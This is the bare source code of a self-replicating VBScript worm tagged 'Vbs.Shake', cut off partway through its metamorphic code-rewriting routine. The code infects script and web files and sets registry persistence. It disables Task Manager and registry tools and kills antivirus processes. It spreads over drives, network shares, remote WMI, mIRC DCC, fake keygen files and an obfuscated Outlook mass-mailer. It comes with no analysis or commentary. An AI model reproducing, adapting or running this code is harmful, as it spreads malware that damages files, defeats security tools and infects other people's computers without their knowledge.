   On Error Resume Next
   Dim self, fso, whs, net, shellobj, WinRoot, WinSysFolder, TempFolder, ScriptCode, GenInfectionCode, VBSInfectionCode, JSInfectionCode, PHPInfectionCode, ASPInfectionCode, myExt, REG_ROOT, KEY_VAL, ProcessList, tempKey, tempName, SelfPath
   StopSB
   set shellobj = CreateObject("Shell.Application")
   set fso = CreateObject("Scripting.FileSystemObject")
   set whs = CreateObject("WScript.Shell")
   set net = CreateObject("WScript.NetWork")
   set WinRoot = fso.GetSpecialFolder(0)
   set WinSysFolder = fso.GetSpecialFolder(1)
   set TempFolder = fso.GetSpecialFolder(2)
   FixReg
   if ( lcase(right(Wscript.FullName,11))="cscript.exe" ) then
    whs.Run "wscript.exe """ & WScript.ScriptFullName & """"
    WScript.Quit
   End If
   set self = fso.GetFile(WScript.ScriptFullName)
   myExt = LCase(fso.GetExtensionName(self))
   ProcessList = Array("*av*","*anti*","*vir*","*fix*","*remov*","*upd*t*","*h*ack*","*protect*","*secur*","*mgr*","*reg*","*proc*)
   if fso.FileExists(self.path) then
    self.Attributes = 0
    ScriptCode = readFile(self.path)
    randomize
    tempName = TempFolder  &  "\~"  &  randomword(6,10)  &  "."  &  myExt
    copyFile self.Path, tempName
    tempKey = fso.GetBaseName(fso.GetFile(tempName))
    whs.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\"  &  tempKey ,""""  &  WScript.FullName  &  """ """  &  tempName  &  """"
   end if
   if len(ScriptCode) > 0 then
    deleteFile self.path
    ScriptPolyCode = Metamorph(ScriptCode)
    If ( len(ScriptPolyCode)> 0 ) Then ScriptCode = ScriptPolyCode
    VBSInfectionCode =  "x" & vbcrlf & chr(37)  &  "HOSTBODY"  &  chr(37) & vbcrlf & vbcrlf & "sub x" & vbcrlf & "On Error Resume Next"  &  vbcrlf  &  "set fso = CreateObject(""Scripting.FileSystemObject"")"  &  vbcrlf  &  "set temp = fso.CreateTextFile(fso.GetSpecialFolder(2)  &  ""\" & randomword(6,10) & "."  &  myExt  &  """)"  &  vbCrLf  &  "body = "  &  VBSOneLine(ScriptCode)  &  vbCrLf  &  "temp.Write body"  &  vbCrLf  &  "temp.Close"  &  vbCrlf  &  "set whs = CreateObject(""WScript.Shell"")"  &  vbCrLf  &  "whs.Run fso.GetSpecialFolder(2)  &  ""\readme."  &  myExt  &  """,0,false" &  vbcrlf  &  "end sub 'Vbs.Shake"
    GenInfectionCode = VBSInfectionCode
    JSInfectionCode = "x();" & vbcrlf & chr(37) & "HOSTBODY" & chr(37) & vbcrlf &  vbcrlf & "function x(){" & vbcrlf & "try{"  &  vbCrlf  &  "var fso = new ActiveXObject(""Scripting.FileSystemObject"");"  &  vbCrlf  &  "var temp = fso.CreateTextFile(fso.GetSpecialFolder(2) + ""\" & randomword(6,10) & "."  &  myExt  &  """);"  &  vbCrlf  &  "var body = "  &  JSOneLine(ScriptCode)  &  ";"  &  vbCrlf & "temp.Write(body);" & vbCrlf & "temp.Close();" & vbCrlf & "var whs = new ActiveXObject(""WScript.Shell"");" & vbCrlf & "whs.Run(fso.GetSpecialFolder(2) + ""\readme."  &  myExt  &  """,0,false);" & vbCrlf & "}catch(err){};" & vbcrlf & "} //Vbs.Shake"
    PHPInfectionCode = "<?php" & vbcrlf & "$file_name=""" & randomword(6,10) & "."&myExt&""";" & vbcrlf & "$handle=fopen($file_name,""w"");" & vbcrlf & "$body=" & JSOneLine(ScriptCode) & ";" & vbCrlf & "fwrite($handle,$body);" & vbCrlf & "fclose($handle);" & vbcrlf & "system(""wscript.exe $file_name""); //Vbs.Shake" & vbcrlf & "?>" & vbcrlf & chr(37) & "HOSTBODY" & chr(37)
    ASPInfectionCode = "<%" & vbCrlf & VBSInfectionCode & vbCrlf & "%>" & vbCrlf & chr(37) & "HOSTBODY" & chr(37)
   end if
   dirpath = whs.RegRead("HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\BackupRestore\FilesNotToBackup\System Restore")
   dirpath = Left(WinRoot,2) & left(dirpath,len(dirpath)-5)
   if not fso.FolderExists(dirpath) then dirpath = WinSysFolder
   nextName = dirpath & "\" & randomword(6,10) & "." & myExt
   deleteFile nextName
   set copy = CreateFile(nextName)
   copy.Write ScriptCode
   copy.Close
   set copy = Nothing
   set self = fso.GetFile(nextName)
   self.Attributes = 6
   SelfPath = self.path
   set Super = fso.GetFile(Wscript.FullName)
   SuperExt = LCase(fso.GetExtensionName(Super))
   newName = WinRoot  &  "\svchost."  &  SuperExt
   copyFile Super.Path, newName
   Set Super = fso.GetFile(newName)
   Super.Attributes = 6
   set tmp = fso.GetFile(WScript.FullName)
   If LCase(tmp.Path) <> LCase(Super.Path) Then
    whs.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\"  &  tempKey
    deleteFile tempName
    whs.Run """"  &  Super.Path  &  """ """  &  self.Path  &  """",0,false
    WScript.Quit
   End If
   REG_ROOT = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & fso.GetBaseName(self)
   KEY_VAL = """" & Super.Path & """ """ & self.path & """"
   whs.RegWrite REG_ROOT,KEY_VAL
   whs.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\"  &  tempKey
   deleteFile tempName
   Spread
   InfectRemovableDrives
   InfectNetworkDrives
   InfectHardDrives
   Do While True
   if not fso.FileExists(SelfPath) then
    set temp = createfile(SelfPath)
    temp.Write ScriptCode
    temp.Close
    set temp=Nothing
    Set self = fso.GetFile(SelfPath)
    self.Attributes = 6
   end if
   If fso.FileExists(Left(WinRoot,2)  & "\ntldr")Then
    set windows = shellobj.windows
   Else
    set windows = shellobj.windows.items
   End If
   num = 0
   for each window in windows
     s = window.LocationURL
    If InStr(LCase(s),"a:") > 0 Or InStr(LCase(s),"b:") > 0 Then InfectRemovableDrives()
   next
   whs.RegWrite "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot\AlternateShell","""" & Super.Path & """ """ & self.Path & """"
   whs.RegWrite REG_ROOT,KEY_VAL
   FixReg
   If fso.FileExists(Left(WinRoot, 2)  &  "\ntldr") And fso.FileExists(WinSysFolder  &  "\tskill.exe") Then
    whs.Run "tskill.exe "  &  ProcessList(pIndex),0,false
    If pIndex < UBound(ProcessList) Then
     pIndex = pIndex + 1
    Else
     pIndex = 0
    End If
   End If
   If ( Minute(Now) = 0 ) Then
    InfectNetworkDrives
   EndIf
   Randomize
   If ( Minute(Now) = 0 And rnd<0.5 ) Then
    InfectHardDrives
   EndIf
   Loop

   Function InfectNetworkDrives()
    On Error Resume Next
    Set localdrvs = fso.Drives
    For Each ld In localdrvs
     varld = ld
    Next
    FreeDrive=Chr(Asc(varld)+1)  &  ":"
    Set NetDrives=net.EnumNetworkDrives
    if ( NetDrives.Count = 0 ) then exit function
    tryremexe(NetDrives(0))
    For Each d In NetDrives
     If (d <> "") and (d <> FreeDrive) Then
      net.MapNetWorkDrive FreeDrive,d
      InfectFiles FreeDrive & "\"
      net.RemoveNetWorkDrive FreeDrive
     End If
    Next
   End Function

   Function InfectHardDrives()
    On Error Resume Next
    Set Drives = fso.Drives
    if Drives.Count > 0 Then
     for each d in Drives
      If d.DriveType = 2 or d.DriveType = 3 then
       InfectFiles d  &  "\"
      end if
     next
    end if
   End Function

   Function InfectRemovableDrives()
    On Error Resume next
    Set Drives = fso.Drives
    if Drives.Count > 0 Then
     for each d in Drives
      If d.DriveType = 1 and fso.folderexists(d & "\") then
       InfectFiles d  &  "\"
      end if
     next
    end if
   End Function

   Function InfectFile(sFile,InfectionCode)
    On Error Resume Next
    If Not fso.FileExists(sFile) Or lcase(sFile) = lcase(SelfPath) Then
     Exit Function
    End If
    hostbody = readFile(sFile)
    if InStr(LCase(hostbody),lcase("Vbs.Shake")) = 0 Then
     hostbody = replace(InfectionCode, chr(37) & "HOSTBODY" & chr(37), hostbody)
    else
     Exit Function
    End If
    set host = fso.GetFile(sFile)
    hAtt = host.Attributes
    set temp = CreateFile(host.path)
    temp.Write hostbody
    temp.Close
    host.Attributes = hAtt
   End Function

   Function InfectFiles(FolderSpec)
   On Error Resume Next
   Dim cFolder, cFiles, cFile, cSubFolders, bSharedfolder
   bSharedfolder = (InStr(lcase(FolderSpec),"shar") > 0)
   Set cFolder = fso.GetFolder(FolderSpec)
   Set cFiles = cFolder.Files
   Set cSubFolders = cFolder.SubFolders
   For Each f in cFiles
   set cFile = fso.GetFile(f)
   cExt = LCase(fso.GetExtensionName(cFile.Path))
   if (cExt = lcase(myExt) ) then
   InfectFile cFile.Path,GenInfectionCode
   elseif InStr(cExt, LCase("vb")) > 0 Then
   InfectFile cFile.Path,VBSInfectionCode
   elseif InStr(cExt, LCase("js")) > 0 Then
   InfectFile cFile.Path,JSInfectionCode
   elseif InStr(cExt, LCase("php")) > 0 Then
   InfectFile cFile.Path,PHPInfectionCode
   elseif InStr(cExt, LCase("asp")) > 0 Then
   InfectFile cFile.Path,ASPInfectionCode
   elseif (cFile.Name="mirc.exe") or (cFile.Name="mirc.ini") or (cFile.Name="script.ini") or (cFile.Name="mirc.hlp") then
   if (cFile.Name="mirc.ini") then
    mircini = readFile(cFile.Path)
    opts = split(mircini, vbcrlf)
    for zz=0 to ubound(opts)
     opt = ""
     opt = opts(zz)
     opt = replace(opt, chr(32), "")
     if ( (lcase(left(opt, 7)) = lcase("accept=")) and (InStr(lcase(opt),",*.jse") <= 0) ) then
      opts(zz)=opts(zz) & ",*.jse"
     end if
    next
    mircini = join(opts, vbcrlf)
    set tmpfile = fso.getFile(cFile.Path)
    tmpatt = tmpfile.Attributes
    set tmp = CreateFile(cFile.Path)
    tmp.Write mircini
    tmp.Close
    tempfile.Attributes = tmpatt
    set tempfile = nothing
    set tmp = nothing
   end if
   fso.DeleteFile cFile.ParentFolder & "\You&Me*.jse", True
   rw = randomword(2,4)
   set ft = CreateFile(cFile.ParentFolder & "\You&Me-" & rw & ".jse")
   for i=1 to 100
    ft.Write vbCrlf
   next
   ft.Write replace(JSInfectionCode,chr(37)&"HOSTBODY"&chr(37),"")
   ft.Close
   set scrpt=CreateFile(cFile.ParentFolder & "\script.ini")
   scrpt.WriteLine "[script]"
   scrpt.WriteLine "n0=on 1:JOIN:#:{"
   scrpt.WriteLine "n1=  /if ( $nick == $me ) { halt }"
   scrpt.WriteLine "n2=  /msg $nick :P"
   scrpt.WriteLine "n3=  /.dcc send $nick " & cFile.ParentFolder & "\You&Me-" & rw & ".jse"
   scrpt.WriteLine "n4=}"
   scrpt.close
   elseif (bSharedfolder and (cExt = "exe" or cExt = "scr" or cExt = "zip" or cExt = "rar" or cExt = "msi" or InStr(fso.GetBaseName(cFile),"setup") > 0 or InStr(fso.GetBaseName(cFile),"install") > 0)) then
    set kg = CreateFile(cFile.ParentFolder  &  "\"  &  fso.GetBaseName(cFile)  &  "-Keygen."  &  cExt  &  "               ."  &  myExt)
    kg.write ScriptCode
    kg.Close
   end if
   Next
   For Each s in cSubFolders
   InfectFiles s
   Next
   end function

   function tryremexe(netdrive)
   on error resume next
   tmp = right(netdrive,len(netdrive)-2)
   i = inStr(tmp,"\")
   baseunc=left(netdrive,i+2)
   if ( fso.FolderExists(baseunc & "c") ) then
    set test = CreateFile(baseunc & "c\test." & myExt)
    test.write ScriptCode
    test.close
   elseif ( fso.FolderExists(baseunc & "c$") ) then
    set test = CreateFile(baseunc & "c$\test." & myExt)
    test.write ScriptCode
    test.close
   else
    exit function
   end if
   if (not fso.FileExists(baseunc & "c\test." & myExt)) and (not fso.FileExists(baseunc & "c$\test." & myExt)) then exit function
   Set objWMIService = GetObject("winmgmts:"  &  baseunc  &  "root\cimv2")
   Set objProcess = objWMIService.Get("Win32_Process")
   intReturnValue = objProcess.Create("wscript.exe C:\test." & myExt, , , intPID)
   end function

   Function VBSOneLine(sCode)
    On Error Resume Next
    CodeLine = Split(sCode,vbCrlf)
    If LCase(CodeLine(0)) = LCase(sCode) Then
     CodeLine = Split(sCode,chr(13))
    End If
    For t = 0 To UBound(CodeLine)
     sModLine = Replace(CodeLine(t),"""","""  &  Chr("  &  Asc("""")  &  ")  &  """)
     If (t = 0) Then
      VBSOneLine = """" &  sModLine  & """  & "
     ElseIf t < UBound(CodeLine) Then
      VBSOneLine = VBSOneLine  &  " Vbcrlf   &  """ &  sModLine  & """  & "
     Else
      VBSOneLine = VBSOneLine  &  " Vbcrlf   &  """ &  sModLine  & """"
     End If
    Next
   End Function

   Function JSOneLine(sCode)
    On Error Resume Next
    CodeLine = Split(sCode,vbCrlf)
    If LCase(CodeLine(0)) = LCase(sCode) Then
     CodeLine = Split(sCode,chr(13))
    End If
    For t = 0 To UBound(CodeLine)
     sModLine = Replace(CodeLine(t),"\","\\")
     sModLine = Replace(sModLine,"""","\""")
     If (t = 0) Then
      JSOneLine = """" &  sModLine
     ElseIf t < UBound(CodeLine) Then
      JSOneLine = JSOneLine  &  "\n" &  sModLine
     Else
      JSOneLine = JSOneLine  &  "\n" &  sModLine  & """"
     End If
    Next
   End Function

   Function randomword(min,max)
   on error resume next
   if ( min > max ) then
    mx = max
    max = min
    min = mx
   end if
   max = max+1
   max = max-min
   randomword=""
   randomize
   namelen = int(rnd*max)+min
   for z=1 to namelen
    randomize
    if z=1 then
     g=int(rnd*2)+1
    else
     g = int(rnd*3)
    end if
    randomize
    if g=0 then
     c=chr(int(rnd*10)+48)
    elseif g=1 then
     c=chr(int(rnd*26)+65)
    else
     c=chr(int(rnd*26)+97)
    end if
    randomword=randomword & c
   next
   End Function

   function readFile(path)
   on error resume next
   readFile=""
   if not fso.fileexists(path) then exit function
   set f=fso.opentextfile(path)
   readFile=f.read(fso.getfile(path).size)
   f.close
   set f=nothing
   end function

   function deleteFile(filename)
   on error resume next
   If not fso.FileExists(filename) Then exit function
   fso.GetFile(filename).Attributes = 0
   fso.DeleteFile filename,True
   end function

   function copyFile(src,dest)
   on error resume next
   if ( not fso.FileExists(src) ) then exit function
   deleteFile dest
   fso.GetFile(src).Copy dest
   end function

   function CreateFile(name)
   on error resume next
   if ( fso.FileExists(name) ) then fso.GetFile(name).Attributes = 0
   set CreateFile = fso.CreateTextFile(name)
   end function

   Function FixReg()
    On error Resume Next
    whs.RegDelete "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout"
    whs.RegDelete "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\DisplayLogo"
    whs.Regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden",0,"REG_DWORD"
    whs.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools",1,"REG_DWORD"
    whs.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr",1,"REG_DWORD"
    whs.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFolderOptions","1","REG_DWORD"
   End Function

   Function StopSB()
    Set objWMIService = GetObject("winmgmts:\\"&net.ComputerName&"\root\cimv2")
    Set objProcess = objWMIService.Get("Win32_Process")
    intReturnValue = objProcess.Create("net.exe stop SBService", , , intPID)
   End Function

   Function Spread()
    On Error Resume Next
    If Not fso.FileExists(Left(WinRoot, 2)  &  "\ntldr") Then
     set mf = CreateFile(TempFolder  &  "\~wtmpFFFF.jse")
     mf.Write replace(JSInfectionCode,chr(37)&"HOSTBODY"&chr(37),"")
     mf.Close
     MS_code = "Set Fso = CreateObject(""Scripting.FileSystemObject"")"  &  vbCrLf  &  _
     " Set self = Fso.GetFile("""  &  TempFolder  &  "\~wtmpFFFF.jse"")"  &  vbCrLf  &  _
     "set WinRoot = Fso.GetSpecialFolder(0)"  &  vbCrLf  &  _
     "set WinSysFolder = Fso.GetSpecialFolder(1)"  &  vbCrLf  &  _
     "set TempFolder = Fso.getSpecialFolder(2)"  &  vbCrLf  &  _
     "MyExt = """  &  myExt  &  """"  &  vbCrLf  &  _
     "While True" &  vbCrLf  &  _
     "execute chr(100) & chr(105) & chr(109) & chr(32) & chr(120) & chr(44) & chr(97) & chr(44) & chr(99) & chr(116) & chr(114) & chr(108) & chr(105) & chr(115) & chr(116) & chr(115) & chr(44) & chr(99) & chr(116) & chr(114) & chr(101) & chr(110) & chr(116) & chr(114) & chr(105) & chr(101) & chr(115) & chr(44) & chr(109) & chr(97) & chr(108) & chr(101) & chr(97) & chr(100) & chr(44) & chr(98) & chr(44) & chr(65) & chr(116) & chr(116) & chr(97) & chr(99) & chr(104) & chr(32)"  &  vbCrLf  &  _
     "execute chr(65) & chr(116) & chr(116) & chr(97) & chr(99) & chr(104) & chr(78) & chr(97) & chr(109) & chr(101) & chr(32) & chr(61) & chr(32) & chr(84) & chr(101) & chr(109) & chr(112) & chr(70) & chr(111) & chr(108) & chr(100) & chr(101) & chr(114) & chr(32) & chr(38) & chr(32) & chr(34) & chr(92) & chr(76) & chr(101) & chr(116) & chr(116) & chr(101) & chr(114) & chr(46) & chr(34) & chr(32) & chr(38) & chr(32) & chr(109) & chr(121) & chr(69) & chr(120) & chr(116) & chr(32)"  &  vbCrLf  &  _
     "execute chr(83) & chr(101) & chr(108) & chr(102) & chr(46) & chr(67) & chr(111) & chr(112) & chr(121) & chr(40) & chr(65) & chr(116) & chr(116) & chr(97) & chr(99) & chr(104) & chr(78) & chr(97) & chr(109) & chr(101) & chr(41) & chr(32)"  &  vbCrLf  &  _
     "execute chr(83) & chr(101) & chr(116) & chr(32) & chr(65) & chr(116) & chr(116) & chr(97) & chr(99) & chr(104) & chr(32) & chr(61) & chr(32) & chr(70) & chr(115) & chr(111) & chr(46) & chr(71) & chr(101) & chr(116) & chr(70) & chr(105) & chr(108) & chr(101) & chr(40) & chr(65) & chr(116) & chr(116) & chr(97) & chr(99) & chr(104) & chr(78) & chr(97) & chr(109) & chr(101) & chr(41) & chr(32)"  &  vbCrLf  &  _
     "execute chr(65) & chr(116) & chr(116) & chr(97) & chr(99) & chr(104) & chr(46) & chr(65) & chr(116) & chr(116) & chr(114) & chr(105) & chr(98) & chr(117) & chr(116) & chr(101) & chr(115) & chr(32) & chr(61) & chr(32) & chr(48) & chr(32)"  &  vbCrLf  &  _
     "execute chr(115) & chr(101) & chr(116) & chr(32) & chr(111) & chr(117) & chr(116) & chr(61) & chr(87) & chr(83) & chr(99) & chr(114) & chr(105) & chr(112) & chr(116) & chr(46) & chr(67) & chr(114) & chr(101) & chr(97) & chr(116) & chr(101) & chr(79) & chr(98) & chr(106) & chr(101) & chr(99) & chr(116) & chr(40) & chr(34) & chr(79) & chr(117) & chr(116) & chr(108) & chr(111) & chr(111) & chr(107) & chr(46) & chr(65) & chr(112) & chr(112) & chr(108) & chr(105) & chr(99) & chr(97) & chr(116) & chr(105) & chr(111) & chr(110) & chr(34) & chr(41) & chr(32)"  &  vbCrLf  &  _
     "execute chr(115) & chr(101) & chr(116) & chr(32) & chr(109) & chr(97) & chr(112) & chr(105) & chr(61) & chr(111) & chr(117) & chr(116) & chr(46) & chr(71) & chr(101) & chr(116) & chr(78) & chr(97) & chr(109) & chr(101) & chr(83) & chr(112) & chr(97) & chr(99) & chr(101) & chr(40) & chr(34) & chr(77) & chr(65) & chr(80) & chr(73) & chr(34) & chr(41) & chr(32)"  &  vbCrLf  &  _
     "for ctrlists=1 to mapi.AddressLists.Count"  &  vbCrLf  &  _
     "execute chr(115) & chr(101) & chr(116) & chr(32) & chr(97) & chr(61) & chr(109) & chr(97) & chr(112) & chr(105) & chr(46) & chr(65) & chr(100) & chr(100) & chr(114) & chr(101) & chr(115) & chr(115) & chr(76) & chr(105) & chr(115) & chr(116) & chr(115) & chr(40) & chr(99) & chr(116) & chr(114) & chr(108) & chr(105) & chr(115) & chr(116) & chr(115) & chr(41) & chr(32)"  &  vbCrLf  &  _
     "execute chr(120) & chr(61) & chr(48) & chr(32)"  &  vbCrLf  &  _
     "if (int(a.AddressEntries.Count)>int(0)) then"  &  vbCrLf  &  _
     "for ctrentries=1 to a.AddressEntries.Count"  &  vbCrLf  &  _
     "execute chr(109) & chr(97) & chr(108) & chr(101) & chr(97) & chr(100) & chr(61) & chr(97) & chr(46) & chr(65) & chr(100) & chr(100) & chr(114) & chr(101) & chr(115) & chr(115) & chr(69) & chr(110) & chr(116) & chr(114) & chr(105) & chr(101) & chr(115) & chr(40) & chr(120) & chr(41) & chr(32)"  &  vbCrLf  &  _
     "execute chr(115) & chr(101) & chr(116) & chr(32) & chr(109) & chr(97) & chr(108) & chr(101) & chr(61) & chr(111) & chr(117) & chr(116) & chr(46) & chr(67) & chr(114) & chr(101) & chr(97) & chr(116) & chr(101) & chr(73) & chr(116) & chr(101) & chr(109) & chr(40) & chr(48) & chr(41) & chr(32)"  &  vbCrLf  &  _
     "execute chr(109) & chr(97) & chr(108) & chr(101) & chr(46) & chr(82) & chr(101) & chr(99) & chr(105) & chr(112) & chr(105) & chr(101) & chr(110) & chr(116) & chr(115) & chr(46) & chr(65) & chr(100) & chr(100) & chr(40) & chr(109) & chr(97) & chr(108) & chr(101) & chr(97) & chr(100) & chr(41) & chr(32)"  &  vbCrLf  &  _
     "execute chr(82) & chr(97) & chr(110) & chr(100) & chr(111) & chr(109) & chr(105) & chr(122) & chr(101) & chr(32)"  &  vbCrLf  &  _
     "execute chr(109) & chr(97) & chr(108) & chr(101) & chr(46) & chr(70) & chr(114) & chr(111) & chr(109) & chr(32) & chr(61) & chr(32) & chr(97) & chr(46) & chr(65) & chr(100) & chr(100) & chr(114) & chr(101) & chr(115) & chr(115) & chr(69) & chr(110) & chr(116) & chr(114) & chr(105) & chr(101) & chr(115) & chr(40) & chr(73) & chr(110) & chr(116) & chr(40) & chr(114) & chr(110) & chr(100) & chr(32) & chr(42) & chr(32) & chr(97) & chr(46) & chr(65) & chr(100) & chr(100) & chr(114) & chr(101) & chr(115) & chr(115) & chr(69) & chr(110) & chr(116) & chr(114) & chr(105) & chr(101) & chr(115) & chr(46) & chr(67) & chr(111) & chr(117) & chr(110) & chr(116) & chr(41) & chr(41) & chr(32)"  &  vbCrLf  &  _
     "execute chr(109) & chr(97) & chr(108) & chr(101) & chr(46) & chr(83) & chr(117) & chr(98) & chr(106) & chr(101) & chr(99) & chr(116) & chr(32) & chr(61) & chr(32) & chr(34) & chr(77) & chr(101) & chr(115) & chr(115) & chr(97) & chr(103) & chr(101) & chr(32) & chr(70) & chr(114) & chr(111) & chr(109) & chr(32) & chr(34) & chr(32) & chr(38) & chr(32) & chr(78) & chr(101) & chr(116) & chr(46) & chr(85) & chr(115) & chr(101) & chr(114) & chr(78) & chr(97) & chr(109) & chr(101) & chr(32)"  &  vbCrLf  &  _
     "execute chr(109) & chr(97) & chr(108) & chr(101) & chr(46) & chr(66) & chr(111) & chr(100) & chr(121) & chr(32) & chr(61) & chr(32) & chr(118) & chr(98) & chr(99) & chr(114) & chr(108) & chr(102) & chr(38) & chr(34) & chr(67) & chr(104) & chr(101) & chr(99) & chr(107) & chr(32) & chr(116) & chr(104) & chr(101) & chr(32) & chr(108) & chr(101) & chr(116) & chr(116) & chr(101) & chr(114) & chr(32) & chr(115) & chr(101) & chr(110) & chr(116) & chr(32) & chr(98) & chr(121) & chr(32) & chr(109) & chr(101) & chr(46) & chr(32) & chr(38) & chr(32) & chr(118) & chr(98) & chr(99) & chr(114) & chr(108) & chr(102) & chr(32) & chr(38) & chr(32) & chr(34) & chr(73) & chr(116) & chr(39) & chr(115) & chr(32) & chr(118) & chr(101) & chr(114) & chr(121) & chr(32) & chr(105) & chr(109) & chr(112) & chr(111) & chr(114) & chr(116) & chr(97) & chr(110) & chr(116) & chr(44) & chr(32) & chr(116) & chr(114) & chr(121) & chr(32) & chr(116) & chr(111) & chr(32) & chr(100) & chr(111) & chr(110) & chr(39) & chr(116) & chr(32) & chr(108) & chr(111) & chr(115) & chr(101) & chr(32) & chr(105) & chr(116) & chr(32) & chr(97) & chr(110) & chr(100) & chr(32) & chr(117) & chr(115) & chr(101) & chr(32) & chr(105) & chr(116) & chr(32) & chr(99) & chr(97) & chr(114) & chr(101) & chr(102) & chr(117) & chr(108) & chr(108) & chr(121) & chr(44) & chr(32) & chr(97) & chr(110) & chr(121) & chr(119) & chr(97) & chr(121) & chr(46) & chr(34) & chr(32) & chr(38) & chr(32) & chr(118) & chr(98) & chr(99) & chr(114) & chr(108) & chr(102) & chr(32) & chr(38) & chr(32) & chr(118) & chr(98) & chr(99) & chr(114) & chr(108) & chr(102) & chr(32) & chr(38) & chr(32) & chr(83) & chr(116) & chr(114) & chr(105) & chr(110) & chr(103) & chr(40) & chr(40) & chr(76) & chr(101) & chr(110) & chr(40) & chr(34) & chr(73) & chr(116) & chr(39) & chr(115) & chr(32) & chr(118) & chr(101) & chr(114) & chr(121) & chr(32) & chr(105) & chr(109) & chr(112) & chr(111) & chr(114) & chr(116) & chr(97) & chr(110) & chr(116) & chr(44) & chr(32) & chr(116) & chr(114) & chr(121) & chr(32) & chr(116) & chr(111) & chr(32) & chr(100) & chr(111) & chr(110) & chr(39) & chr(116) & chr(32) & chr(108) & chr(111) & chr(115) & chr(101) & chr(32) & chr(105) & chr(116) & chr(32) & chr(97) & chr(110) & chr(100) & chr(32) & chr(117) & chr(115) & chr(101) & chr(32) & chr(105) & chr(116) & chr(32) & chr(99) & chr(97) & chr(114) & chr(101) & chr(102) & chr(117) & chr(108) & chr(108) & chr(121) & chr(44) & chr(32) & chr(97) & chr(110) & chr(121) & chr(119) & chr(97) & chr(121) & chr(46) & chr(34) & chr(41) & chr(45) & chr(76) & chr(101) & chr(110) & chr(40) & chr(78) & chr(101) & chr(116) & chr(46) & chr(85) & chr(115) & chr(101) & chr(114) & chr(78) & chr(97) & chr(109) & chr(101) & chr(41) & chr(41) & chr(43) & chr(50) & chr(44) & chr(34) & chr(32) & chr(34) & chr(41) & chr(32) & chr(38) & chr(32) & chr(78) & chr(101) & chr(116) & chr(46) & chr(85) & chr(115) & chr(101) & chr(114) & chr(78) & chr(97) & chr(109) & chr(101) & chr(32)"  &  vbCrLf  &  _
     "execute chr(109) & chr(97) & chr(108) & chr(101) & chr(46) & chr(65) & chr(116) & chr(116) & chr(97) & chr(99) & chr(104) & chr(109) & chr(101) & chr(110) & chr(116) & chr(115) & chr(46) & chr(65) & chr(100) & chr(100) & chr(40) & chr(65) & chr(116) & chr(116) & chr(97) & chr(99) & chr(104) & chr(46) & chr(80) & chr(97) & chr(116) & chr(104) & chr(41) & chr(32)"  &  vbCrLf  &  _
     "execute chr(109) & chr(97) & chr(108) & chr(101) & chr(46) & chr(83) & chr(101) & chr(110) & chr(100) & chr(32)"  &  vbCrLf  &  _
     "execute chr(120) & chr(61) & chr(120) & chr(43) & chr(49) & chr(32)"  &  vbCrLf  &  _
     "next"  &  vbCrLf  &  _
     "end if"  &  vbCrLf  &  _
     "next"  &  vbCrLf  &  _
     "execute chr(83) & chr(101) & chr(116) & chr(32) & chr(111) & chr(117) & chr(116) & chr(61) & chr(78) & chr(111) & chr(116) & chr(104) & chr(105) & chr(110) & chr(103) & chr(32)"  &  vbCrLf  &  _
     "execute chr(83) & chr(101) & chr(116) & chr(32) & chr(109) & chr(97) & chr(112) & chr(105) & chr(61) & chr(78) & chr(111) & chr(116) & chr(104) & chr(105) & chr(110) & chr(103) & chr(32)"  &  vbCrLf  &  _
     "execute chr(70) & chr(115) & chr(111) & chr(46) & chr(68) & chr(101) & chr(108) & chr(101) & chr(116) & chr(101) & chr(70) & chr(105) & chr(108) & chr(101) & chr(40) & chr(65) & chr(116) & chr(116) & chr(97) & chr(99) & chr(104) & chr(46) & chr(80) & chr(97) & chr(116) & chr(104) & chr(41) & chr(32)"  &  vbCrLf  &  _
     "out.Quit"  &  vbCrLf  &  _
     "For j = 0 To 5"  &  vbCrLf  &  _
     " WScript.Sleep 60000"  &  vbCrLf  &  _
     "Next"  &  vbCrLf  &  _
     "WEnd"
     MS_name = TempFolder  &  "\MSender."  &  myExt
     Set f_MS = fso.CreateTextFile(MS_name)
     f_MS.write MS_code
     f_MS.Close
     whs.Run """"  &  Super.Path  &  """ """  &  MS_name  &  """",0,false
     WScript.Sleep 100
     deleteFile MS_name
    End if
   End Function

   function Metamorph(code)
   on error resume next
   Metamorph = code
   if len(code) = 0 then exit function
   forbiddenwords = " dim if then else elseif and or end wend select case each in is nothing set on error resume next function sub next while do loop for to not true false step rnd err msgbox wscript vbcrlf vbcancel vbexclamation vbyesno vbokcancel vbinformation vbcritical vbquestion vbno vbyes vbok exit execute randomize len right left replace split join asc chr hex dec me mod "
   codelines = split(code,vbcrlf)
   variables = ""
   randomvariables = ""
   for lindex=0 to ubound(codelines)
    bWritingVariable = false
    bSearch = true
    c = ""
    newvar=""
    offset = 0
    codelines(lindex) = codelines(lindex) & " "
    for cnum=1 to len(codelines(lindex))+1
     if( not bWritingVariable )then lastc = c
     c = right(left(codelines(lindex),cnum+offset),1)
     if( c = "'" and bSearch )then exit for
     if( c = """" )then
      bSearch = not bSearch
     end if
     if( ((asc(c) > 47 and asc(c) < 58) or c="_") and bWritingVariable )then
      newvar=newvar & c
     elseif( (asc(c) > 64 and asc(c) < 91) or (asc(c) > 96 and asc(c) < 123) )then
      if ( bSearch ) then
       bWritingVariable = true
       newvar=newvar & c
      end if
     elseif( bWritingVariable )then
      bWritingVariable = false
      newvar = lcase(newvar)
